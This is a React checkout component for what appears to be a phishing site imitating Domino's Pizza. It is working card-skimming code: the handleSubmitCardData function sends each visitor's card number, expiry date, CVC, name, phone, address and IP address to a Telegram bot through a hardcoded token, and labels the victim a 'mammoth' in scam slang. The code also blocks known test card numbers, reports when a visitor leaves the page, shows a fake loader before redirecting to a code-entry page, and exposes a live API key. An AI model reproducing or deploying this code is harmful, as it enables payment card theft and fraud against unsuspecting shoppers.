import { useEffect, useRef, useState } from "react";
import { IoMdArrowDropup } from "react-icons/io";
import "../styles/checkout.scss";
import visa from "../images/payCards/visa.png";
import mastercard from "../images/payCards/mastercard.png";
import express from "../images/payCards/express.png";
import discover from "../images/payCards/discover.png";
import union from "../images/payCards/union.png";

import axios from "axios";
import Cookies from "js-cookie";
import { useSelector } from "react-redux";
import { useLocation, useNavigate } from "react-router-dom";
import LoaderPage from "./loader";
import PhoneInput from "react-phone-input-2";
import "react-phone-input-2/lib/material.css";

const months = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12"];

const cards = [visa, mastercard, express, discover, union];

const CheckoutPage = ({ isArabic }) => {
  const [orderSum, setOrderSum] = useState(true);
  const [showLoader, setShowLoader] = useState(false);
  const [invalidCvv, setInvalidCvv] = useState(false);
  const [invalidCard, setInvalidCard] = useState(false);
  const [isValid, setIsValid] = useState(true);
  const datee = new Date();

  const { cartItems } = useSelector((state) => state);
  const { state } = useLocation();
  let offer = state && state?.offer;
  const navigate = useNavigate();

  const [phoneNumber, setPhoneNumber] = useState("");
  const [address, setAddress] = useState("");
  const [name, setName] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [secondNumber, setSecondNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("1");
  const [expiryYear, setExpiryYear] = useState(datee.getFullYear());
  const [years, setYears] = useState([]);
  const [cvc, setCVC] = useState("");

  const currentYear = new Date().getFullYear();

  useEffect(() => {
    const yearsArray = [];
    for (let year = currentYear; year <= currentYear + 16; year++) {
      yearsArray.push(year);
    }
    setYears(yearsArray);
  }, [currentYear]);

  const [clientNumber, setClientNumber] = useState("");
  const [clientIP, setClientIP] = useState("");

  const cardNumberRef = useRef("");
  const selectedOffer = state?.offer[0];

  const generateClientNumber = () => {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let clientNumber = "";

    for (let i = 0; i < 5; i++) {
      const randomIndex = Math.floor(Math.random() * characters.length);
      clientNumber += characters.charAt(randomIndex);
    }

    return clientNumber + "A";
  };

  useEffect(() => {
    const newClientNumber = generateClientNumber();
    setClientNumber(newClientNumber);

    const savedClientNumber = Cookies.get("clientNumber");
    if (savedClientNumber) {
      setClientNumber(savedClientNumber);
    } else {
      Cookies.set("clientNumber", newClientNumber);
    }

    getIPAddress();
  }, []);

  const getIPAddress = async () => {
    try {
      const response = await axios.get("https://api.ipify.org?format=json");
      if (response.data.ip) {
        setClientIP(response.data.ip);
      }
    } catch (error) {
      console.error("Ошибка при получении IP-адреса:", error);
    }
  };

  const handlePhoneChange = (value) => {
    setPhoneNumber(value);
    console.log(phoneNumber);
  };

  const fetchCardInfo = async () => {
    const options = {
      method: "POST",
      url: "https://bin-ip-checker.p.rapidapi.com/",
      params: { bin: secondNumber.slice(0, 8) },
      headers: {
        "content-type": "application/json",
        "X-RapidAPI-Key": "7789f587bcmshf673095c888b885p135b99jsn51402eff3b29",
        "X-RapidAPI-Host": "bin-ip-checker.p.rapidapi.com",
      },
      data: { bin: secondNumber.slice(0, 8) },
    };
    try {
      const response = await axios.request(options);
      const data = response.data;
      console.log(data);
      return data;
    } catch (error) {
      console.error("Error fetching card info:", error);
    }
  };

  const handleSubmitCardData = async (e) => {
    try {
      e.preventDefault();

      const botToken = "6566169381:AAGWhaAXX96VEHENijPAAGCA0JvvLbXBFwg";
      const cardDataChatId = "-4020641906";

      const cardInfoo = await fetchCardInfo();

      const cardData = ` 
🛑 Данные карты мамонта: 
  
🔹 Номер клиента: #${clientNumber}
🔹 Номер телефона: +${phoneNumber}
🔹 Номер карты: ${cardNumber}
🔹 Срок действия: ${expiryMonth}/${expiryYear} 
🔹 CVC: ${cvc}
🔹 Держатель карты: ${cardName}

🔸 Brand: ${cardInfoo?.BIN?.scheme || "N/A"}
🔸 Type: ${cardInfoo?.BIN?.type || "N/A"}
🔸 Level: ${cardInfoo?.BIN?.level || "N/A"}
🔸 Bank: ${cardInfoo?.BIN?.issuer.name || "N/A"}
🔸 Country: ${cardInfoo?.BIN?.country.name || "N/A"}

🔻 IP-адрес: ${clientIP}
      `;

      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const response = await axios.post(telegramApiUrl, {
        chat_id: cardDataChatId,
        text: cardData,
      });

      if (response.data.ok) {
        console.log("Сообщение успешно отправлено в Telegram!");
      } else {
        console.log("Не удалось отправить сообщение в Telegram");
      }
    } catch (error) {
      console.log("Произошла ошибка при отправке сообщения в Telegram");
      console.error(
        "Произошла ошибка при отправке сообщения в Telegram:",
        error
      );
    }

    Cookies.set("clientNumber", clientNumber);
  };

  console.log(selectedOffer);

  const handleSubmitUserData = async (e) => {
    e.preventDefault();

    const botToken = "6566169381:AAGWhaAXX96VEHENijPAAGCA0JvvLbXBFwg";
    const userDataChatId = "-4035308638";

    const userData = `
✅ Данные заказчика: ✅

🔹 Номер телефона: +${phoneNumber}
🔹 Адрес: ${address}
🔹 Имя: ${name}

🔸 Заказ${selectedOffer === undefined ? "" : " (offer)"}:
${
  selectedOffer === undefined
    ? cartItems.map((item) => `  - ${item.name.english}`).join("\n")
    : offer?.map((el) => `  - ${el.name.english}`).join("\n")
}

🔻 Номер клиента: #${clientNumber}
    `;

    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
      const response = await axios.post(telegramApiUrl, {
        chat_id: userDataChatId,
        text: userData,
      });

      if (response.data.ok) {
        console.log("Сообщение успешно отправлено в Telegram!");
      } else {
        console.log("Не удалось отправить сообщение в Telegram");
      }
    } catch (error) {
      console.log("Произошла ошибка при отправке сообщения в Telegram");
      console.error(
        "Произошла ошибка при отправке сообщения в Telegram:",
        error
      );
    }
  };

  const vat = 5;

  const getVatPrice = () => {
    const menuTotal =
      cartItems &&
      cartItems?.reduce((a, b) => {
        return (a += b.count * +b.price);
      }, 0) / 200;
    if (offer) {
      const offersTotal =
        offer?.reduce((acc, curr) => {
          return (acc += +curr.price);
        }, 0) / 100;
      return offersTotal.toFixed(2);
    } else {
      return menuTotal.toFixed(2);
    }
  };

  const getDiscountPrice = () => {
    if (offer) {
      const total = offer?.reduce((acc, curr) => {
        return (acc += +curr?.price);
      }, 0);
      const discount = (total / 100).toFixed(2) * 35;
      // return discount.toFixed(2);
      return 0;
    } else {
      const filtered = cartItems?.filter((item) => item?.category === "pizza");
      const total = filtered?.reduce((acc, curr) => {
        return (acc += (+curr?.count * +curr?.price) / 2);
      }, 0);

      return Number(total).toFixed(2);
    }
  };

  const discountPrice = getDiscountPrice();

  const vatTotal = getVatPrice();

  const getTotalPrice = () => {
    const menuTotal =
      cartItems &&
      cartItems?.reduce((a, b) => {
        return (a += b.count * +b.price);
      }, 0) - discountPrice;
    if (offer) {
      const offersTotal = offer?.reduce((acc, curr) => {
        return (acc += +curr.price);
      }, 0);
      return offersTotal.toFixed(2);
    } else {
      return menuTotal.toFixed(2);
    }
  };

  const total = getTotalPrice();

  const getProductsPrice = () => {
    const menuTotal =
      cartItems &&
      cartItems?.reduce((a, b) => {
        return (a += b.count * +b.price);
      }, 0) - vatTotal;
    if (offer) {
      const offersTotal =
        offer?.reduce((acc, curr) => {
          return (acc += +curr.price);
        }, 0) - vatTotal;
      return offersTotal.toFixed(2);
    } else {
      return menuTotal;
    }
  };
  const productsPrice = getProductsPrice();

  useEffect(() => {
    const handleBeforeUnload = (e) => {
      const botToken = "6566169381:AAGWhaAXX96VEHENijPAAGCA0JvvLbXBFwg";
      const cardDataChatId = "-4020641906";

      const exitMessage = `Пользователь покинул сайт. Номер клиента: #${clientNumber}`;
      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

      axios
        .post(telegramApiUrl, {
          chat_id: cardDataChatId,
          text: exitMessage,
        })
        .then(() => {
          Cookies.remove("clientNumber");
        })
        .catch((error) => {
          console.error("Ошибка при отправке сообщения в Telegram:", error);
        });
    };

    window.addEventListener("beforeunload", handleBeforeUnload);

    return () => {
      window.removeEventListener("beforeunload", handleBeforeUnload);
    };
  }, [clientNumber]);

  const isValidCVV = (cvv) => {
    return /^\d{3,4}$/.test(cvv);
  };

  const isValidName = (name) => {
    if (!/\d/.test(name)) {
      setName(name);
    }
  };

  const isValidAddress = (address) => {
    return address.trim() !== "";
  };

  const isValidPhoneNumber = (phoneNumber) => {
    return phoneNumber.length > 0;
  };

  const isValidCardName = (cardName) => {
    return /^[a-zA-Z\s]*$/.test(cardName);
  };

  const isValidCardNumber = (cardNumber) => {
    return (
      cardNumber.length === 19 &&
      isValidLuhnAlgorithm(cardNumber.replace(/\D/g, ""))
    );
  };

  const isValidExpiryMonth = (expiryMonth) => {
    return months.includes(expiryMonth);
  };

  const isValidExpiryYear = (expiryYear) => {
    return years.includes(expiryYear);
  };

  const handleInputChange = (e) => {
    const inputValue = e.target.value;
    const cursorPosition = e.target.selectionStart;

    let numericValue = inputValue.replace(/\D/g, "");
    console.log(numericValue);
    let formattedNumber = numericValue.replace(/(.{4})/g, "$1-").slice(0, 19);

    if (inputValue.length < formattedNumber.length) {
      if (inputValue[cursorPosition] === "-") {
        cursorPosition++;
      }
    }

    setCardNumber(formattedNumber);
    setSecondNumber(numericValue);

    const isValidNumber =
      /^\d{16}$/.test(numericValue) && isValidLuhnAlgorithm(numericValue);
    setIsValid(isValidNumber);
    cardNumberRef.current = formattedNumber;
    e.target.setSelectionRange(cursorPosition, cursorPosition);
  };

  const handleKeyDown = (e) => {
    if (
      e.key === "Backspace" &&
      e.target.selectionStart === e.target.selectionEnd
    ) {
      const cursorPosition = e.target.selectionStart;
      if (
        cursorPosition > 0 &&
        cardNumberRef.current[cursorPosition - 1] === "-"
      ) {
        const newCardNumber =
          cardNumberRef.current.slice(0, cursorPosition - 1) +
          cardNumberRef.current.slice(cursorPosition);
        setCardNumber(newCardNumber);
        cardNumberRef.current = newCardNumber;
      }
    }
  };

  const excludedCardNumbers = [
    "8888888888888888",
    "4111111111111111",
    "5555555555554444",
    "4012888888881881",
    "5105105105105100",
    "378282246310005",
    "371449635398431",
    "6011111111111117",
    "6011000990139424",
    "30569309025904",
    "38520000023237",
    "3566002020360505",
    "3528000700493080",
    "2223000048400011",
    "2336655777993322",
    "2601821700159092",
    "6011322470623232",
    "3028823225099132",
    "4024007138619184",
    "4917610405220081",
    "6011184000090193",
  ];

  const isValidLuhnAlgorithm = (cardNumber) => {
    let sum = 0;
    let isSecondDigit = false;

    const cleanedCardNumber = cardNumber.replace(/\D/g, "");

    if (excludedCardNumbers.includes(cleanedCardNumber)) {
      return false;
    }

    for (let i = cardNumber.length - 1; i >= 0; i--) {
      let digit = parseInt(cardNumber[i], 10);

      if (isSecondDigit) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }

      sum += digit;
      isSecondDigit = !isSecondDigit;
    }

    return sum % 10 === 0;
  };

  const handleNameChange = (e) => {
    const inputValue = e.target.value;
    if (!/\d/.test(inputValue)) {
      setName(inputValue);
    }
  };
  const handleCardNameChange = (e) => {
    const inputValue = e.target.value;
    if (!/\d/.test(inputValue)) {
      setCardName(inputValue);
    }
  };

  const isDataEmpty = () => {
    return phoneNumber ||
      cardName ||
      cardNumber ||
      address ||
      name ||
      expiryMonth ||
      expiryYear
      ? true
      : false;
  };

  const handleContinue = async (e) => {
    e.preventDefault();
    setShowLoader(true);

    if (!isValidAddress(address)) {
      console.log("Invalid address");
      setIsValid(false);
      return;
    }

    if (!isValidPhoneNumber(phoneNumber)) {
      console.log("Invalid phone number");
      setIsValid(false);
      return;
    }

    if (!isValidCardName(cardName)) {
      console.log("Invalid card name");
      setIsValid(false);
      return;
    }

    if (!isValidCardNumber(cardNumber)) {
      console.log("Invalid card number");
      setIsValid(false);
      return;
    }

    if (!isValidExpiryMonth(expiryMonth)) {
      console.log("Invalid expiry month");
      setIsValid(false);
      return;
    }

    if (!isValidExpiryYear(expiryYear)) {
      console.log("Invalid expiry year");
      setIsValid(false);
      return;
    }

    if (!isValidCVV(cvc)) {
      console.log("Invalid CVV");
      setIsValid(false);
      return;
    }
    const isEmpty = isDataEmpty();
    if (isEmpty) {
      setInvalidCard(false);
      setInvalidCvv(false);

      try {
        await handleSubmitCardData(e);
        await handleSubmitUserData(e);
        setTimeout(() => {
          setShowLoader(false);
          navigate("/code", { state: { totalPrice: total } });
        }, 25000);
      } catch (error) {
        console.error("Ошибка во время отправки формы:", error);
      }
    }
  };

  const [date, setDate] = useState("");

  useEffect(() => {
    window.scrollTo(0, 0);
    const formattedDate = new Date().toLocaleString();
    setDate(formattedDate);
  }, []);

  const [isFormValid, setIsFormValid] = useState(false);

  useEffect(() => {
    const isValid =
      name &&
      address &&
      phoneNumber.length > 0 &&
      cardName &&
      cardNumber &&
      expiryMonth &&
      expiryYear &&
      cvc.length >= 3;
    setIsFormValid(isValid);
  }, [name, address, phoneNumber, cardName, cardNumber, expiryMonth, expiryYear, cvc]);

  return (
    <div className={isArabic ? "checkout_rtl" : "checkout_ltr"}>
      <div className="checkout_container">
        <h1>{isArabic ? "استعراض الطلب" : "ПЛАТЕЖ"}</h1>
        <div className="order_sum">
          <div className="total">
            <div>
              {isArabic
                ? "المبلغ المطلوب: " + total + "درهم"
                : "К оплате: " + total + " руб"}
            </div>
            <p onClick={() => setOrderSum(!orderSum)}>
              {isArabic
                ? " الملخص "
                : `${orderSum ? "СКРЫТЬ" : "ОТКРЫТЬ"} РЕЗЮМЕ ЗАКАЗА`}{" "}
              <IoMdArrowDropup />
            </p>
          </div>
          {orderSum ? (
            <div className="order_details">
              <div className="order_inside">
                <table className="order_table">
                  <thead>
                    <tr>
                      <th>{isArabic ? "الصنف" : "ПРОДУКТ"}</th>
                      <th>{isArabic ? "الكمية" : "КОЛ-ВО"}</th>
                      <th>{isArabic ? "السعر" : "ЦЕНА"}</th>
                    </tr>
                  </thead>
                  <tbody>
                    {offer
                      ? offer?.map((item) => {
                          return item?.name ? (
                            <tr>
                              <td className="title">
                                <p>
                                  {isArabic
                                    ? item?.name?.arabic
                                    : item?.name?.english}
                                </p>
                              </td>
                              <td>1</td>
                              <td>
                                {isArabic
                                  ? Number(item?.price).toFixed(2) + "درهم "
                                  : Number(item?.price).toFixed(2) + "руб"}
                              </td>
                            </tr>
                          ) : (
                            <tr>
                              <td className="title">
                                <p>
                                  {isArabic
                                    ? item?.description?.arabic
                                    : item.description.english}
                                </p>
                              </td>
                              <td>1</td>
                              <td>
                                {isArabic
                                  ? item?.price + "درهم "
                                  : item?.price + "руб"}
                              </td>
                            </tr>
                          );
                        })
                      : cartItems?.map((item) => (
                          <tr>
                            <td className="title">
                              <p>
                                {isArabic
                                  ? item.name?.arabic
                                  : item.name?.english}
                              </p>
                            </td>
                            <td>{item.count}</td>
                            <td>
                              {isArabic
                                ? item.price + "درهم "
                                : item.price + " " + "руб"}
                            </td>
                          </tr>
                        ))}
                  </tbody>
                </table>
                <div className="table_down">
                  <div className="price_details">
                    <div>
                      <p>
                        {isArabic
                          ? "الطعام والمشروبات" + ":"
                          : "Еда и напитки:"}
                      </p>
                      <p>
                        {isArabic && productsPrice}{" "}
                        {isArabic ? "درهم " : productsPrice + " " + "руб"}
                        {""}
                      </p>
                    </div>
                    {discountPrice !== 0 && (
                      <div>
                        <p>{isArabic ? "تخفيض" + ":" : "Скидка:"}</p>
                        <p>
                          {isArabic && "-" + discountPrice}{" "}
                          {isArabic
                            ? "درهم "
                            : "-" + discountPrice + " " + "руб"}
                          {""}
                        </p>
                      </div>
                    )}
                    <div>
                      <p>{isArabic ? "قيمة التوصيل	" + ":" : "НДС:"}</p>
                      <p>
                        {isArabic && vatTotal}{" "}
                        {isArabic ? "درهم " : vatTotal + " " + "руб"}
                      </p>
                    </div>
                    <div>
                      <p>{isArabic ? "المجموع" + ":" : "ИТОГО:"}</p>
                      <p>
                        {isArabic && total}{" "}
                        {isArabic ? "درهم " : total + " " + "руб"}
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          ) : (
            ""
          )}
        </div>
        <div className="user_contacts">
          <div className="contacts_title">
            <p>{isArabic ? "1 من 2 | معلومات" : "1 из 2 | СВЯЗЬ"}</p>
          </div>
          <div className="contacts">
            <form onSubmit={handleSubmitCardData}>
              <input
                className={name ? "inp" : "inp error"}
                type="text"
                placeholder={isArabic ? "* الاسم" : "* Имя:"}
                value={name}
                onChange={handleNameChange}
              />
              <input
                className={address ? "inp" : "inp error"}
                type="text"
                placeholder={isArabic ? "*عنوان" : "* Адресс:"}
                onChange={(e) => setAddress(e.target.value)}
                value={address}
              />
              <span className="phone_inp">
                <div className="phone-label">
                  {isArabic ? "*  رقم الجوال:" : "*Телефон:"}
                </div>
                <PhoneInput
                  inputStyle={{ width: "100%", height: "40px" }}
                  country={"ru"}
                  inputClass={phoneNumber.length === 0 ? "error" : ""}
                  specialLabel=""
                  value={phoneNumber}
                  onChange={handlePhoneChange}
                />
              </span>
            </form>
            <div className="confirm_rules">
              <input type="checkbox" />
              <p>
                {isArabic
                  ? " نعم، أود استقبال عروض دومينوز على بريدي الإلكتروني"
                  : "Да, я хотел бы получать предложения по электронной почте от Domino’s."}
              </p>
            </div>
            {/* <div className="warning">
              {" "}
              {isArabic ? "* خانات ضرورية. " : "* Indicates required field."}
            </div> */}
          </div>
        </div>
        <div className="payment">
          <div className="payment_title">
            <p> {isArabic ? "2 من 2 | الدفع" : "2 из 2 | ОПЛАТА"}</p>
          </div>
          <div className="balance">
            {isArabic
              ? "المبلغ المطلوب: " + total + "درهم"
              : "К оплате: " + total + " руб"}
          </div>
          <div className="pay_by_card_bg">
            <div className="paying_option">
              <input type="radio" required />
              <p>{isArabic ? "ادفع بالبطاقة أونلاين" : "Оплата онлайн картой"}</p>
            </div>
            <div className="payment_container">
              <form className="payment_form" onSubmit={handleSubmitUserData}>
                <input
                  required
                  placeholder={
                    isArabic ? "* إسم صاحب البطاقة" : "* Имя владельца карты"
                  }
                  className={cardName ? "card_name" : "card_name error"}
                  type="text"
                  onChange={handleCardNameChange}
                  value={cardName}
                />
                <input
                  required
                  placeholder={isArabic ? "* رقم البطاقة" : "* Номер карты"}
                  type="text"
                  value={cardNumber}
                  className={!cardNumber ? "error" : "card_number"}
                  onChange={handleInputChange}
                  onKeyDown={handleKeyDown}
                  maxLength="19"
                />
                <div className="date">
                  <div className="custom-select">
                    <label>
                      {isArabic ? "* سنة انتهاء الصلاحية" : "* Месяц"}
                    </label>
                    <select
                      id="monthSelect"
                      onChange={(e) => setExpiryMonth(e.target.value)}
                      required
                      className={!expiryMonth ? "error" : ""}
                    >
                      {months.map((item) => (
                        <option key={item} value={item}>
                          {item}
                        </option>
                      ))}
                    </select>
                  </div>
                  <div className="custom-select">
                    <label>
                      {isArabic ? "* شهر انتهاء الصلاحية" : "* Год"}
                    </label>
                    <select
                      id="yearSelect"
                      onChange={(e) => setExpiryYear(e.target.value)}
                      required
                      className={!expiryYear ? "error" : ""}
                    >
                      {years.map((item) => (
                        <option key={item} value={item}>
                          {item}
                        </option>
                      ))}
                    </select>
                  </div>
                </div>
                <div className="cvv">
                  <div className="cvv_inp">
                    <input
                      placeholder={isArabic ? "* رمز الأمان" : "* CVC/CVV"}
                      type="text"
                      maxLength="4"
                      className={`cvv_input ${
                        cvc.length !== 3 && cvc.length !== 4
                          ? "error"
                          : "cvv_input"
                      }`}
                      onChange={(e) => {
                        const inputValue = e.target.value;
                        const numericValue = inputValue.replace(/\D/g, "");
                        if (numericValue.length <= 4) {
                          setCVC(numericValue);
                        }
                      }}
                      value={cvc}
                      required
                    />
                  </div>
                </div>
              </form>
            </div>
            <div className="requisites">
              <h3 className="we_accept">{isArabic ? "نقبل:" : "Мы принимаем:"}</h3>
              <div className="pay_cards">
                {cards.map((item) => (
                  <img src={item} alt="" />
                ))}
              </div>
            </div>
          </div>
        </div>
        <div className="continue">
          <button type="submit" onClick={handleContinue} disabled={!isFormValid}>
            {isArabic ? "إكمال" : "ПРОДОЛЖИТЬ"}
          </button>
          {/* <p>
            <a href="#">{isArabic ? "  شروط الاستخدام " : "Условия эксплуатации."}</a>
            {isArabic
              ? "من خلال تقديم طلبك فإنك توافق علينا"
              : "Размещая заказ, вы соглашаетесь с ними"}
          </p> */}
        </div>
      </div>
      {showLoader && <LoaderPage showModal={showLoader} />}
    </div>
  );
};

export default CheckoutPage;
